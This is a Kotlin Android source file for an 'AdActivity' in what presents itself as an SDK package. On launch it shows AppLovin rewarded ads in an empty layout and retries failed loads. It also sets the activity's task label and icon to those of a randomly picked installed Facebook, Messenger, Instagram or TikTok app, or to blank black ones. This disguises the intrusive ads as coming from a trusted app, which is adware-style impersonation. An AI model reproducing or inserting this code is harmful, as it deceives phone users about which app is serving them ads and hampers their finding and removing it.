package com.app.sdk

import android.app.ActivityManager.TaskDescription
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.graphics.Canvas
import android.graphics.Color
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.core.graphics.createBitmap
import com.app.sdk.sdk.config.SdkConfig
import com.app.sdk.sdk.utils.writeLog
import com.applovin.mediation.MaxAd
import com.applovin.mediation.MaxError
import com.applovin.mediation.MaxReward
import com.applovin.mediation.MaxRewardedAdListener
import com.applovin.mediation.ads.MaxRewardedAd
import com.applovin.sdk.AppLovinSdk


class AdActivity : AppCompatActivity(), MaxRewardedAdListener {
    private var rewardAd: MaxRewardedAd? = null
    private var loadCount = 0

    private val listOfApps = listOf(
        "com.facebook.orca",
        "com.facebook.katana",
        "com.example.facebook",
        "com.facebook.android",
        "com.instagram.android",
        "com.ss.android.ugc.trill"
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.empty)
        setTaskDescription()
        writeLog("Applovin Sdk init")
        with(AppLovinSdk.getInstance(this)) {
            if (isInitialized) loadAdAPp()
            else {
                mediationProvider = "max"
                initializeSdk {
                    writeLog("Applovin Sdk init")
                    loadAdAPp()
                }
            }
        }
    }

    private fun setTaskDescription() {
        getApplicationInfoForApp()
            .let(::getTaskDescription)
            .let(::setTaskDescription)
    }

    @Suppress("DEPRECATION")
    private fun getTaskDescription(info: ApplicationInfo?) = if (info != null)
        TaskDescription(info.loadLabel(packageManager).toString(), getLogoBitmap(info), Color.WHITE)
    else TaskDescription(" ", getLogoBitmap(info), Color.BLACK)

    private fun getLogoBitmap(info: ApplicationInfo?) = createBitmap(100, 100).apply {
        val canvas = Canvas(this)
        info?.loadIcon(packageManager)?.let {
            it.setBounds(0, 0, width, height)
            it.draw(canvas)
        } ?: eraseColor(Color.BLACK)
    }

    private fun loadAdAPp() {
        writeLog("Try load Ad")
        loadCount++
        rewardAd = MaxRewardedAd.getInstance(SdkConfig.adUnitId, this)
            .apply {
                setListener(this@AdActivity)
                this.loadAd()
            }
    }

    override fun onAdLoaded(ad: MaxAd) {
        writeLog("Ad loaded and showing")
        rewardAd?.showAd()
    }

    override fun onAdDisplayed(ad: MaxAd?) {
        writeLog("Ad displayed")
    }

    override fun onAdHidden(ad: MaxAd?) {
        writeLog("Ad Hidden")
    }

    override fun onAdClicked(ad: MaxAd?) {

    }

    override fun onAdLoadFailed(adUnitId: String?, error: MaxError) {
        writeLog("Ad Load failed " + error.message)
        if (loadCount == 5) finishAndRemoveTask()
        else loadAdAPp()
    }

    override fun onAdDisplayFailed(ad: MaxAd, error: MaxError) {
        writeLog("Ad display failed")
        finishAndRemoveTask()
    }

    override fun onRewardedVideoStarted(ad: MaxAd) {
        writeLog("Ad started")
    }

    override fun onRewardedVideoCompleted(ad: MaxAd) {
        finishAndRemoveTask()
    }

    override fun onUserRewarded(ad: MaxAd?, reward: MaxReward?) {

    }

    private fun getApplicationInfoForApp() = listOfApps
        .mapNotNull(::existApplicationInfo)
        .randomOrNull()

    private fun existApplicationInfo(packageName: String) = try {
        packageManager.getApplicationInfo(packageName, PackageManager.GET_META_DATA)
    } catch (e: Exception) {
        null
    }

}